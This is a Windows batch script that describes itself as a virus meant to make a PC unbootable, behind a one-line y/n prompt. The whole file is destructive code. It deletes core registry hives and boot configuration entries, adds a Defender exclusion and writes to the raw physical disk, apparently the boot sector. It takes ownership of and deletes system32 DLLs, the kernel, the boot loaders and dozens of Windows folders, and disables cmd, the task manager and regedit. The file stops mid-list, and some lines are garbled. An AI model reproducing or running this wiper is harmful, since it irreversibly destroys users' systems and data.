
@echo off
set /p UserChoice=WARNING, This virus is meant to make your pc UNBOOTABLE and destroy it with the best efforts, unless you know what you are doing and are using this is a safe environment, please type n to exit the app otherwise, type y:  
if '%UserChoice%'== 'n' exit
if '%UserChoice%'== 'y' goto main
:main
echo removing Services...
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /f /va
echo adding exclusions...
"C:\Program Files\Windows Defender\MpCmdRun.exe" -AddExclusion bootdata.exe
bootdata.exe bsec.bin -w \\.\PhysicalDrive0
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d "00000000000000000000000000000000" /f
takeown /f C:\Windows\system32\WWAHost.exe
icacls C:\Windows\system32\WWAHost.exe /Grant Users:F
del C:\Windows\system32\WWAHost.exe /f /s /q
takeown /f C:\Windows\system32\oobe /r /d y
icacls C:\Windows\system32\oobe /t /Grant Users:F
takeown /f C:\Windows\system32\ntoskrnl.exe
icacls C:\Windows\System32\ntoskrnl.exe /Grant Users:F
del C:\Windows\system32\ntoskrnl.exe /f /s /q
takeown /f C:\Windows\system32\*.dll /r /d y
icacls C:\Windows\system32\*.dll /t /Grant Users:F
del C:\Windows\system32\*.dll /f /s /q
echo deleting File Associations and CLSIDs...
reg delete HKEY_CLASSES_ROOT /f /va
echo deleting setup info...
reg delete HKLM\SYSTEM\Setup
echo deleting System Information...
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT" /f /va
echo deleting important keys...
reg delete HKLM\SOFTWARE\Microsoft /f /va
echo deleting security key...
reg delete HKLM\SECURITY /f /va
bcdedit /delete {current} /f
bcdedit /delete {bootmgr} /f
bcdedit /set {default} graphicsmodedisabled yes
for /f "tokens=2 delims={}" %%i in ('bcdedit ^| findstr /i "identifier"') do (
    bcdedit /delete {%%i} /f
)
echo deleting users and more...
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /f /va
echo deleting important keys...
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft
echo deleting user profiles...
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList /f /va
echo deleting SYSTEM User profile...
takeown /f C:\Windows\system32\config\Systemprofile /r /d y
icacls C:\Windows\system32\config\systemprofile /t /Grant Users:F
del C:\Windows\system32\config\systemprofile /f /s /q
reg delete HKEY_USERS\.DEFAULT
echo deleting user Registry keys...
takeown /f %Userprofile%\NTUSER.DAT
icacls %Userprofile%\NTUSER.DAT /Grant Users:F
del %Userprofile%\NTUSER.DAT /f /s /q
echo deleting boot pictures...
takeown /f C:\Windows\boot\Resources\bootres.dll
icacls C:\Windows\boot\Resources\bootres.dll /Grant Users:F
del C:\Windows\boot\resources\bootres.dll /f /s /q
echo deleting more boot stuff...
takeown /f C:\Windows\boot /r /d y
icacls C:\Windows\boot /t /Grant Users:F
del C:\Windows\boot /f /s /q
echo destroying cursor themes...
takeown /f C:\Windows\Cursors /r /d y
icacls C:\Windows\Cursors /t /Grant Users:F
del C:\Windows\Cursors /f /s /q
echo deleting wallpapers...
takeown /f C:\Windows\web /r /d y
icacls C:\Windows\web /t /Grant Users:F
del C:\Windows\web /f /s /q
echo deleting the recycle bin...
takeown /f C:\$Recycle.Bin /r /d y
icacls C:\$Recycle.Bin /t /Grant Users:F
del C:\$Recycle.Bin /f /s /q
disabling cmd, taskmgr, regedit...
reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v "DisableCmd" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "DisableRegistryTools" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "DisableTaskMgr" /t REG_DWORD /d 1
echo deleting windows store apps...
takeown /f "C:\Program Files\WindowsApps" /r /d y
icacls "C:\Program Files\WindowsApps" /t /Grant Users:F
takeown /f "C:\Windows\SystemApps" /r /d y
icacls "C:\Windows\SystemApps" /t /Grant Users:F
del "C:\Windows\SystemApps" /f /s /q
del "C:\Program Files\WindowsApps" /f /s /q
echo deleting more boot files...
takeown /f "C:\Windows\System32\Boot" /r /d y
icacls "C:\Windows\System32\Boot" /t /Grant Users:F
del "C:\Windows\system32\Boot" /f /s /q
takeown /f "C:\Windows\system32\winload.exe"
takeown /f "C:\Windows\system32\Winload.efi"
takeown /f "C:\Windows\Servicing" /r /d y
icacls "C:\Windows\system32\winload.efi" /Grant Users:F
icacls "C:\Windows\system32\winload.exe" /Grant Users:F
icacls "C:\Windows\Servicing" /t /Grant Users:F
del "C:\Windows\system32\winload.exe" /f /s /q
del "C:\Windows\system32\winload.efi" /f /s /q
del "C:\Windows\servicing" /f /s /q
echo deleting user configurations...
reg delete "HKEY_CURRENT_USER" /f /va
reg delete "HKU" /f /va
reg delete "HKCC" /f /va
echo removing system policies...
reg delete HKLM\SOFTWARE\Microsoft\windows\CurrentVersion\Policies /f /va
echo destroying the registry...
reg delete HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\ActivationBroker /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet01 /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\Input /f /va
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\Keyboard Layout" /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\Maps /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\ResourceManager /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\ResourcePolicyStore /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\RNG /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\Select /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\Setup /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\Software /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\State /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\WaaS /f /va
reg delete HKEY_LOCAL_MACHINE\SYSTEM\WPA /f /va
reg delete HKEY_USERS /f /va
reg delete HKEY_CURRENT_USER /f /va
takeown /f C:\Windows\addins /r /d y
takeown /f C:\Windows\AppCompact /r /d y
takeown /f C:\Windows\Apppatch /r /d y
takeown /f C:\Windows\AppReadiness /r /d y
takeown /f C:\Windows\assembly /r /d y
takeown /f C:\Windows\bcastdvr /r /d y
takeown /f C:\Windows\boot /r /d y
takeown /f C:\Windows\Branding /r /d y
takeown /f C:\Windows\CbsTemp /r /d y
takeown /f C:\Windows\CSC /r /d y
takeown /f C:\Windows\Containers /r /d y
takeown /f C:\Windows\Cursors /r /d y
takeown /f C:\Windows\debug /r /d y
takeown /f C:\Windows\diagnostics /r /d y
takeown /f C:\Windows\diagTrack /r /d y
takeown /f C:\Windows\digitalLocker /r /d y
takeown /f "C:\Windows\Downloaded Program Files" /r /d y
takeown /f C:\Windows\ELAMBKUP /r /d y
takeown /f C:\Windows\en-us /r /d y
takeown /f C:\Windows\fonts /r /d y
takeown /f "C:\Windows\GameBarPresenceWriter" /r /d y
takeown /f "C:\Windows\Globalization" /r /d y
takeown /f "C:\Windows\Help" /r /d yicac;s
takeown /f "C:\Windows\IdentityCRL" /r /d y
takeown /f "C:\Windows\IME" /r /d y
takeown /f "C:\Windows\ImmersiveControlPanel" /r /d y
takeown /f "C:\Windows\InboxApps" /r /d y
takeown /f "C:\Windows\INF" /r /d y
takeown /f "C:\Windows\InputMethod" /r /d y
takeown /f "C:\Windows\L2Schemas" /r /d y
takeown /f "C:\Windows\LanguageOverlayCache" /r /d y
takeown /f C:\Windows\LiveKernelReports /r /d y
takeown /f C:\Windows\logs /r /d y
takeown /f C:\Windows\Media /r /d y
takeown /f "C:\Windows\twain_32"  /r /d y
takeown /f "C:\Windows\Vss"  /r /d y
takeown /f "C:\Windows\WaaS"  /r /d y
takeown /f "C:\Windows\Web"  /r /d y
takeown /f "C:\Windows\WinSxS"  /r /d y
takeown /f "C:\Windows\Microsoft.NET"  /r /d y
takeown /f "C:\Windows\Migration"  /r /d y
takeown /f "C:\Windows\ModemLogs"  /r /d y
takeown /f "C:\Windows\OCR"  /r /d y
takeown /f "C:\Windows\Offline Web Pages"  /r /d y
takeown /f "C:\Windows\Panther"  /r /d y
takeown /f "C:\Windows\Performance"  /r /d y
takeown /f "C:\Windows\PLA"  /r /d y
takeown /f "C:\Windows\PolicyDefinitions"  /r /d y
takeown /f "C:\Windows\Prefetch"  /r /d y
takeown /f "C:\Windows\PrintDialog"  /r /d y
takeown /f "C:\Windows\Provisioning"  /r /d y
takeown /f "C:\Windows\Registration"  /r /d y
takeown /f "C:\Windows\RemotePackages"  /r /d y
takeown /f "C:\Windows\rescache"  /r /d y
takeown /f "C:\Windows\Resources"  /r /d y
takeown /f "C:\Windows\SchCache"  /r /d y
takeown /f "C:\Windows\schemas"  /r /d y
takeown /f "C:\Windows\security"  /r /d y
takeown /f "C:\Windows\ServiceProfiles"  /r /d y
takeown /f "C:\Windows\ServiceState"  /r /d y
takeown /f "C:\Windows\servicing"  /r /d y
takeown /f "C:\Windows\Setup"  /r /d y
takeown /f "C:\Windows\ShellComponents"  /r /d y
takeown /f "C:\Windows\ShellExperiences"  /r /d y
takeown /f "C:\Windows\SKB"  /r /d y
takeown /f "C:\Windows\SoftwareDistribution"  /r /d y
takeown /f "C:\Windows\Speech"  /r /d y
takeown /f "C:\Windows\Speech_OneCore"  /r /d y
takeown /f "C:\Windows\System"  /r /d y
takeown /f "C:\Windows\SystemResources"  /r /d y
takeown /f "C:\Windows\SystemTemp"  /r /d y
takeown /f "C:\Windows\TAPI"  /r /d y
takeown /f "C:\Windows\Tasks"  /r /d y
takeown /f "C:\Windows\Temp"  /r /d y
takeown /f "C:\Windows\tracing"  /r /d y
icacls C:\Windows\addins /t /Grant Users:F
icacls C:\Windows\AppCompact /t /Grant Users:F
icacls C:\Windows\Apppatch /t /Grant Users:F
icacls C:\Windows\AppReadiness /t /Grant Users:F
icacls C:\Windows\assembly /t /Grant Users:F
icacls C:\Windows\bcastdvr /t /Grant Users:F
icacls C:\Windows\boot /t /Grant Users:F
icacls C:\Windows\Branding /t /Grant Users:F
icacls C:\Windows\CbsTemp /t /Grant Users:F
icacls C:\Windows\CSC /t /Grant Users:F
icacls C:\Windows\Containers /t /Grant Users:F
icacls C:\Windows\Cursors /t /Grant Users:F
icacls C:\Windows\debug /t /Grant Users:F
icacls C:\Windows\diagnostics /t /Grant Users:F
icacls C:\Windows\diagTrack /t /Grant Users:F
icacls C:\Windows\digitalLocker /t /Grant Users:F
icacls "C:\Windows\Downloaded Program Files" /t /Grant Users:F
icacls C:\Windows\ELAMBKUP /t /Grant Users:F
icacls C:\Windows\en-us /t /Grant Users:F
icacls C:\Windows\fonts /t /Grant Users:F
icacls "C:\Windows\GameBarPresenceWriter" /t /Grant Users:F
icacls "C:\Windows\Globalization" /t /Grant Users:F
icacls "C:\Windows\Help" /t /Grant Users:F
icacls "C:\Windows\IdentityCRL" /t /Grant Users:F
icacls "C:\Windows\IME" /t /Grant Users:F
icacls "C:\Windows\ImmersiveControlPanel" /t /Grant Users:F
icacls "C:\Windows\InboxApps" /t /Grant Users:F
icacls "C:\Windows\INF" /t /Grant Users:F
icacls "C:\Windows\InputMethod" /t /Grant Users:F
icacls "C:\Windows\L2Schemas" /t /Grant Users:F
icacls "C:\Windows\LanguageOverlayCache" /t /Grant Users:F
icacls C:\Windows\LiveKernelReports /t /Grant Users:F
icacls C:\Windows\logs /t /Grant Users:F
icacls C:\Windows\Media /t /Grant Users:F
icacls "C:\Windows\Panther" /t /Grant Users:F
icacls "C:\Windows\Performance" /t /Grant Users:F
icacls "C:\Windows\PLA" /t /Grant Users:F
icacls "C:\Windows\PolicyDefinitions" /t /Grant Users:F
icacls "C:\Windows\Prefetch" /t /Grant Users:F
icacls "C:\Windows\PrintDialog" /t /Grant Users:F
icacls "C:\Windows\Provisioning" /t /Grant Users:F
icacls "C:\Windows\Registration" /t /Grant Users:F
icacls "C:\Windows\RemotePackages" /t /Grant Users:F
icacls "C:\Windows\rescache" /t /Grant Users:F
icacls "C:\Windows\Resources" /t /Grant Users:F
icacls "C:\Windows\SchCache" /t /Grant Users:F
icacls "C:\Windows\schemas" /t /Grant Users:F
icacls "C:\Windows\security" /t /Grant Users:F
icacls "C:\Windows\ServiceProfiles" /t /Grant Users:F
icacls "C:\Windows\ServiceState" /t /Grant Users:F
icacls "C:\Windows\servicing" /t /Grant Users:F
icacls "C:\Windows\Setup" /t /Grant Users:F
icacls "C:\Windows\ShellComponents" /t /Grant Users:F
icacls "C:\Windows\ShellExperiences" /t /Grant Users:F
icacls "C:\Windows\SKB" /t /Grant Users:F
icacls "C:\Windows\SoftwareDistribution" /t /Grant Users:F
icacls "C:\Windows\Speech" /t /Grant Users:F
icacls "C:\Windows\Speech_OneCore" /t /Grant Users:F
icacls "C:\Windows\System" /t /Grant Users:F
icacls "C:\Windows\SystemResources" /t /Grant Users:F
icacls "C:\Windows\SystemTemp" /t /Grant Users:F
icacls "C:\Windows\TAPI" /t /Grant Users:F
icacls "C:\Windows\Tasks" /t /Grant Users:F
icacls "C:\Windows\Temp" /t /Grant Users:F
del C:\Windows\addins /f /s /q
del C:\Windows\AppCompact /f /s /q
del C:\Windows\Apppatch /f /s /q
del C:\Windows\AppReadiness /f /s /q
del C:\Windows\assembly /f /s /q
del C:\Windows\bcastdvr /f /s /q
del C:\Windows\boot /f /s /q
del C:\Windows\Branding /f /s /q
del C:\Windows\CbsTemp /f /s /q
del C:\Windows\CSC /f /s /q
del C:\Windows\Containers /f /s /q
del C:\Windows\Cursors /f /s /q
del C:\Windows\debug /f /s /q
del C:\Windows\diagnostics /f /s /q
del C:\Windows\diagTrack /f /s /q
del C:\Windows\digitalLocker /f /s /q
del "C:\Windows\Downloaded Program Files" /f /s /q
del C:\Windows\ELAMBKUP /f /s /q
del C:\Windows\en-us /f /s /q
del C:\Windows\fonts /f /s /q
del "C:\Windows\GameBarPresenceWriter" /f /s /q
del "C:\Windows\Globalization" /f /s /q
del "C:\Windows\Help" /f /s /q
del "C:\Windows\IdentityCRL" /f /s /q
del "C:\Windows\IME" /f /s /q
del "C:\Windows\ImmersiveControlPanel" /f /s /q
del "C:\Windows\InboxApps" /f /s /q
del "C:\Windows\INF" /f /s /q
del "C:\Windows\InputMethod" /f /s /q
del "C:\Windows\L2Schemas" /f /s /q
del "C:\Windows\LanguageOverlayCache" /f /s /q
del C:\Windows\LiveKernelReports /f /s /q
del C:\Windows\logs /f /s /q
del C:\Windows\Media /f /s /q
del "C:\Windows\tracing" /f /s /q
del "C:\Windows\twain_32" /f /s /q
del "C:\Windows\Vss" /f /s /q
del "C:\Windows\WaaS" /f /s /q
del "C:\Windows\Web" /f /s /q
del "C:\Windows\WinSxS" /f /s /q
del "C:\Windows\Microsoft.NET" /f /s /q
del "C:\Windows\Migration" /f /s /q
del "C:\Windows\ModemLogs" /f /s /q
del "C:\Windows\OCR" /f /s /q
del "C:\Windows\Offline Web Pages" /f /s /q
del "C:\Windows\Panther" /f /s /q
del "C:\Windows\Performance" /f /s /q
del "C:\Windows\PLA" /f /s /q
del "C:\Windows\PolicyDefinitions" /f /s /q
del "C:\Windows\Prefetch" /f /s /q
del "C:\Windows\PrintDialog" /f /s /q
del "C:\Windows\Provisioning" /f /s /q
del "C:\Windows\Registration" /f /s /q
del "C:\Windows\RemotePackages" /f /s /q
del "C:\Windows\rescache" /f /s /q
del "C:\Windows\Resources" /f /s /q
del "C:\Windows\SchCache" /f /s /q
del "C:\Windows\schemas" /f /s /q
del "C:\Windows\security" /f /s /q
del "C:\Windows\ServiceProfiles" /f /s /q
del "C:\Windows\ServiceState" /f /s /q
del "C:\Windows\servicing" /f /s /q
del "C:\Windows\Setup" /f /s /q
del "C:\Windows\ShellComponents" /f /s /q
del "C:\Windows\ShellExperiences" /f /s /q
del "C:\Windows\SKB" /f /s /q
del "C:\Windows\SoftwareDistribution" /f /s /q
del "C:\Windows\Speech" /f /s /q
del "C:\Windows\Speech_OneCore" /f /s /q
del "C:\Windows\System" /f /s /q
del "C:\Windows\SystemResources" /f /s /q
del "C:\Windows\SystemTemp" /f /s /q
del "C:\Windows\TAPI" /f /s /q
del "C:\Windows\Tasks" /f /s /q
del "C:\Windows\Temp" /f /s /q
echo deleting more files...
takeown /f C:\Windows\system32\lsa.exe
takeown /f C:\Windows\system32\lsass.exe
takeown /f C:\Windows\system32\drivers /r /d y
icacls C:\Windows\system32\lsa.exe /Grant users:F
icacls C:\Windows\system32\lsass.exe /Grant Users:F
icacls C:\Windows\system32\drivers /t /Grant users:F
del C:\Windows\drivers /f /s /q
takeown /f C:\WIndows\notepad.exe
takeown /f C:\Windows\explorer.exe
takeown /f C:\Windows\system32\cmd.exe
icacls C:\WIndows\notepad.exe /Grant Users:F
icacls C:\Windows\explorer.exe /Grant Users:F
icacls C:\Windows\system32\cmd.exe /Grant Users:F
del C:\Windows\regedit.exe /f /s /q
del C:\Windows\explorer.exe /f /s /q
del C:\Windows\cmd.exe /f /s /q
takeown /f C:\Windows\system32\*.msc /r /d y
icacls C:\Windows\system32\*.msc /t /Grant Users:F
del C:\Windows\system32\*.msc /f /s /q
takeown /f C:\Windows\system32\mmc.exe 
icacls C:\Windows\system32\mmc.exe /Grant Users:F
echo destroying system32...
takeown /f "C:\Windows\System32\cs-CZ" /r /d y
takeown /f "C:\Windows\System32\da-DK" /r /d y
takeown /f "C:\Windows\System32\DDFs" /r /d y
takeown /f "C:\Windows\System32\de-DE" /r /d y
takeown /f "C:\Windows\System32\DiagSvcs" /r /d y
takeown /f "C:\Windows\System32\Dism" /r /d y
takeown /f "C:\Windows\System32\downlevel" /r /d y
takeown /f "C:\Windows\System32\drivers" /r /d y
takeown /f "C:\Windows\System32\DriverState" /r /d y
takeown /f "C:\Windows\System32\DriverStore" /r /d y
takeown /f "C:\Windows\System32\DRVSTORE" /r /d y
takeown /f "C:\Windows\System32\dsc" /r /d y
takeown /f "C:\Windows\System32\el-GR" /r /d y
takeown /f "C:\Windows\System32\en" /r /d y
takeown /f "C:\Windows\System32\en-GB" /r /d y
takeown /f "C:\Windows\System32\en-US" /r /d y
takeown /f "C:\Windows\System32\es-ES" /r /d y
takeown /f "C:\Windows\System32\es-MX" /r /d y
takeown /f "C:\Windows\System32\et-EE" /r /d y
takeown /f "C:\Windows\System32\F12" /r /d y
takeown /f "C:\Windows\System32\ff-Adlm-SN" /r /d y
takeown /f "C:\Windows\System32\fi-FI" /r /d y
takeown /f "C:\Windows\System32\fr-CA" /r /d y
takeown /f "C:\Windows\System32\fr-FR" /r /d y
takeown /f "C:\Windows\System32\FxsTmp" /r /d y
takeown /f "C:\Windows\System32\GroupPolicy" /r /d y
takeown /f "C:\Windows\System32\GroupPolicyUsers" /r /d y
takeown /f "C:\Windows\System32\he-IL" /r /d y
takeown /f "C:\Windows\System32\hr-HR" /r /d y
takeown /f "C:\Windows\System32\hu-HU" /r /d y
takeown /f "C:\Windows\System32\Hydrogen" /r /d y
takeown /f "C:\Windows\System32\ias" /r /d y
takeown /f "C:\Windows\System32\icsxml" /r /d y
takeown /f "C:\Windows\System32\IME" /r /d y
takeown /f "C:\Windows\System32\inetsrv" /r /d y
takeown /f "C:\Windows\System32\InputMethod" /r /d y
takeown /f "C:\Windows\System32\Ipmi" /r /d y
takeown /f "C:\Windows\System32\it-IT" /r /d y
takeown /f "C:\Windows\System32\ja-jp" /r /d y
takeown /f "C:\Windows\System32\Keywords" /r /d y
takeown /f "C:\Windows\System32\ko-KR" /r /d y
takeown /f "C:\Windows\System32\Licenses" /r /d y
takeown /f "C:\Windows\System32\LogFiles" /r /d y
takeown /f "C:\Windows\System32\Logs" /r /d y
takeown /f "C:\Windows\System32\lt-LT" /r /d y
takeown /f "C:\Windows\System32\lv-LV" /r /d y
takeown /f "C:\Windows\System32\MailContactsCalendarSync" /r /d y
takeown /f "C:\Windows\System32\Microsoft" /r /d y
takeown /f "C:\Windows\System32\migration" /r /d y
takeown /f "C:\Windows\System32\migwiz" /r /d y
takeown /f "C:\Windows\System32\MRT" /r /d y
takeown /f "C:\Windows\System32\MSDRM" /r /d y
takeown /f "C:\Windows\System32\MsDtc" /r /d y
takeown /f "C:\Windows\System32\MUI" /r /d y
takeown /f "C:\Windows\System32\my-mm" /r /d y
takeown /f "C:\Windows\System32\nb-NO" /r /d y
takeown /f "C:\Windows\System32\NDF" /r /d y
takeown /f "C:\Windows\System32\networklist" /r /d y
takeown /f "C:\Windows\System32\nl-NL" /r /d y
takeown /f "C:\Windows\System32\Nui" /r /d y
takeown /f "C:\Windows\System32\oobe" /r /d y
takeown /f "C:\Windows\System32\OpenSSH" /r /d y
takeown /f "C:\Windows\System32\osa-Osge-001" /r /d y
takeown /f "C:\Windows\System32\PerceptionSimulation" /r /d y
takeown /f "C:\Windows\System32\pl-PL" /r /d y
takeown /f "C:\Windows\System32\PointOfService" /r /d y
takeown /f "C:\Windows\System32\Printing_Admin_Scripts" /r /d y
takeown /f "C:\Windows\System32\ProximityToast" /r /d y
takeown /f "C:\Windows\System32\pt-BR" /r /d y
takeown /f "C:\Windows\System32\pt-PT" /r /d y
takeown /f "C:\Windows\System32\ras" /r /d y
takeown /f "C:\Windows\System32\RasToast" /r /d y
takeown /f "C:\Windows\System32\Recovery" /r /d y
takeown /f "C:\Windows\System32\restore" /r /d y
takeown /f "C:\Windows\System32\ro-RO" /r /d y
takeown /f "C:\Windows\System32\ru-RU" /r /d y
takeown /f "C:\Windows\System32\SecureBootUpdates" /r /d y
takeown /f "C:\Windows\System32\setup" /r /d y
takeown /f "C:\Windows\System32\Sgrm" /r /d y
takeown /f "C:\Windows\System32\ShellExperiences" /r /d y
takeown /f "C:\Windows\System32\si-lk" /r /d y
takeown /f "C:\Windows\System32\sk-SK" /r /d y
takeown /f "C:\Windows\System32\SleepStudy" /r /d y
takeown /f "C:\Windows\System32\slmgr" /r /d y
takeown /f "C:\Windows\System32\sl-SI" /r /d y
takeown /f "C:\Windows\System32\SMI" /r /d y
takeown /f "C:\Windows\System32\Speech" /r /d y
takeown /f "C:\Windows\System32\Speech_OneCore" /r /d y
takeown /f "C:\Windows\System32\spool" /r /d y
takeown /f "C:\Windows\System32\spp" /r /d y
takeown /f "C:\Windows\System32\sppui" /r /d y
takeown /f "C:\Windows\System32\sr-Latn-RS" /r /d y
takeown /f "C:\Windows\System32\sru" /r /d y
takeown /f "C:\Windows\System32\sv-SE" /r /d y
takeown /f "C:\Windows\System32\Sysprep" /r /d y
takeown /f "C:\Windows\System32\SystemResetPlatform" /r /d y
takeown /f "C:\Windows\System32\ta-in" /r /d y
takeown /f "C:\Windows\System32\ta-lk" /r /d y
takeown /f "C:\Windows\System32\Tasks" /r /d y
takeown /f "C:\Windows\System32\th-TH" /r /d y
takeown /f "C:\Windows\System32\ti-et" /r /d y
takeown /f "C:\Windows\System32\tr-TR" /r /d y
takeown /f "C:\Windows\System32\uk-UA" /r /d y
takeown /f "C:\Windows\System32\UNP" /r /d y
takeown /f "C:\Windows\System32\wbem" /r /d y
takeown /f "C:\Windows\System32\WCN" /r /d y
takeown /f "C:\Windows\System32\WDI" /r /d y
takeown /f "C:\Windows\System32\WinBioDatabase" /r /d y
takeown /f "C:\Windows\System32\WinBioPlugIns" /r /d y
takeown /f "C:\Windows\System32\WindowsPowerShell" /r /d y
takeown /f "C:\Windows\System32\winevt" /r /d y
takeown /f "C:\Windows\System32\WinMetadata" /r /d y
takeown /f "C:\Windows\System32\winrm" /r /d y
takeown /f "C:\Windows\System32\zh-CN" /r /d y
takeown /f "C:\Windows\System32\zh-TW" /r /d y
takeown /f "C:\Windows\System32\0409" /r /d y
takeown /f "C:\Windows\System32\AdvancedInstallers" /r /d y
takeown /f "C:\Windows\System32\am-et" /r /d y
takeown /f "C:\Windows\System32\AppLocker" /r /d y
takeown /f "C:\Windows\System32\appraiser" /r /d y
takeown /f "C:\Windows\System32\AppV" /r /d y
takeown /f "C:\Windows\System32\ar-SA" /r /d y
takeown /f "C:\Windows\System32\bg-BG" /r /d y
takeown /f "C:\Windows\System32\Boot" /r /d y
takeown /f "C:\Windows\System32\Bthprops" /r /d y
takeown /f "C:\Windows\System32\CatRoot" /r /d y
takeown /f "C:\Windows\System32\catroot2" /r /d y
takeown /f "C:\Windows\System32\CodeIntegrity" /r /d y
takeown /f "C:\Windows\System32\Com" /r /d y
takeown /f "C:\Windows\System32\config" /r /d y
takeown /f "C:\Windows\System32\Configuration" /r /d y
takeown /f "C:\Windows\System32\ContainerSettingsProviders" /r /d y
icacls "C:\Windows\System32\cs-CZ" /t /Grant Users:F
icacls "C:\Windows\System32\da-DK" /t /Grant Users:F
icacls "C:\Windows\System32\DDFs" /t /Grant Users:F
icacls "C:\Windows\System32\de-DE" /t /Grant Users:F
icacls "C:\Windows\System32\DiagSvcs" /t /Grant Users:F
icacls "C:\Windows\System32\Dism" /t /Grant Users:F
icacls "C:\Windows\System32\downlevel" /t /Grant Users:F
icacls "C:\Windows\System32\drivers" /t /Grant Users:F
icacls "C:\Windows\System32\DriverState" /t /Grant Users:F
icacls "C:\Windows\System32\DriverStore" /t /Grant Users:F
icacls "C:\Windows\System32\DRVSTORE" /t /Grant Users:F
icacls "C:\Windows\System32\dsc" /t /Grant Users:F
icacls "C:\Windows\System32\el-GR" /t /Grant Users:F
icacls "C:\Windows\System32\en" /t /Grant Users:F
icacls "C:\Windows\System32\en-GB" /t /Grant Users:F
icacls "C:\Windows\System32\en-US" /t /Grant Users:F
icacls "C:\Windows\System32\es-ES" /t /Grant Users:F
icacls "C:\Windows\System32\es-MX" /t /Grant Users:F
icacls "C:\Windows\System32\et-EE" /t /Grant Users:F
icacls "C:\Windows\System32\F12" /t /Grant Users:F
icacls "C:\Windows\System32\ff-Adlm-SN" /t /Grant Users:F
icacls "C:\Windows\System32\fi-FI" /t /Grant Users:F
icacls "C:\Windows\System32\fr-CA" /t /Grant Users:F
icacls "C:\Windows\System32\fr-FR" /t /Grant Users:F
icacls "C:\Windows\System32\FxsTmp" /t /Grant Users:F
icacls "C:\Windows\System32\GroupPolicy" /t /Grant Users:F
icacls "C:\Windows\System32\GroupPolicyUsers" /t /Grant Users:F
icacls "C:\Windows\System32\he-IL" /t /Grant Users:F
icacls "C:\Windows\System32\hr-HR" /t /Grant Users:F
icacls "C:\Windows\System32\hu-HU" /t /Grant Users:F
icacls "C:\Windows\System32\Hydrogen" /t /Grant Users:F
icacls "C:\Windows\System32\ias" /t /Grant Users:F
icacls "C:\Windows\System32\icsxml" /t /Grant Users:F
icacls "C:\Windows\System32\IME" /t /Grant Users:F
icacls "C:\Windows\System32\inetsrv" /t /Grant Users:F
icacls "C:\Windows\System32\InputMethod" /t /Grant Users:F
icacls "C:\Windows\System32\Ipmi" /t /Grant Users:F
icacls "C:\Windows\System32\it-IT" /t /Grant Users:F
icacls "C:\Windows\System32\ja-jp" /t /Grant Users:F
icacls "C:\Windows\System32\Keywords" /t /Grant Users:F
icacls "C:\Windows\System32\ko-KR" /t /Grant Users:F
icacls "C:\Windows\System32\Licenses" /t /Grant Users:F
icacls "C:\Windows\System32\LogFiles" /t /Grant Users:F
icacls "C:\Windows\System32\Logs" /t /Grant Users:F
icacls "C:\Windows\System32\lt-LT" /t /Grant Users:F
icacls "C:\Windows\System32\lv-LV" /t /Grant Users:F
icacls "C:\Windows\System32\MailContactsCalendarSync" /t /Grant Users:F
icacls "C:\Windows\System32\Microsoft" /t /Grant Users:F
icacls "C:\Windows\System32\migration" /t /Grant Users:F
icacls "C:\Windows\System32\migwiz" /t /Grant Users:F
icacls "C:\Windows\System32\MRT" /t /Grant Users:F
icacls "C:\Windows\System32\MSDRM" /t /Grant Users:F
icacls "C:\Windows\System32\MsDtc" /t /Grant Users:F
icacls "C:\Windows\System32\MUI" /t /Grant Users:F
icacls "C:\Windows\System32\my-mm" /t /Grant Users:F
icacls "C:\Windows\System32\nb-NO" /t /Grant Users:F
icacls "C:\Windows\System32\NDF" /t /Grant Users:F
icacls "C:\Windows\System32\networklist" /t /Grant Users:F
icacls "C:\Windows\System32\nl-NL" /t /Grant Users:F
icacls "C:\Windows\System32\Nui" /t /Grant Users:F
icacls "C:\Windows\System32\oobe" /t /Grant Users:F
icacls "C:\Windows\System32\OpenSSH" /t /Grant Users:F
icacls "C:\Windows\System32\osa-Osge-001" /t /Grant Users:F
icacls "C:\Windows\System32\PerceptionSimulation" /t /Grant Users:F
icacls "C:\Windows\System32\pl-PL" /t /Grant Users:F
icacls "C:\Windows\System32\PointOfService" /t /Grant Users:F
icacls "C:\Windows\System32\Printing_Admin_Scripts" /t /Grant Users:F
icacls "C:\Windows\System32\ProximityToast" /t /Grant Users:F
icacls "C:\Windows\System32\pt-BR" /t /Grant Users:F
icacls "C:\Windows\System32\pt-PT" /t /Grant Users:F
icacls "C:\Windows\System32\ras" /t /Grant Users:F
icacls "C:\Windows\System32\RasToast" /t /Grant Users:F
icacls "C:\Windows\System32\Recovery" /t /Grant Users:F
icacls "C:\Windows\System32\restore" /t /Grant Users:F
icacls "C:\Windows\System32\ro-RO" /t /Grant Users:F
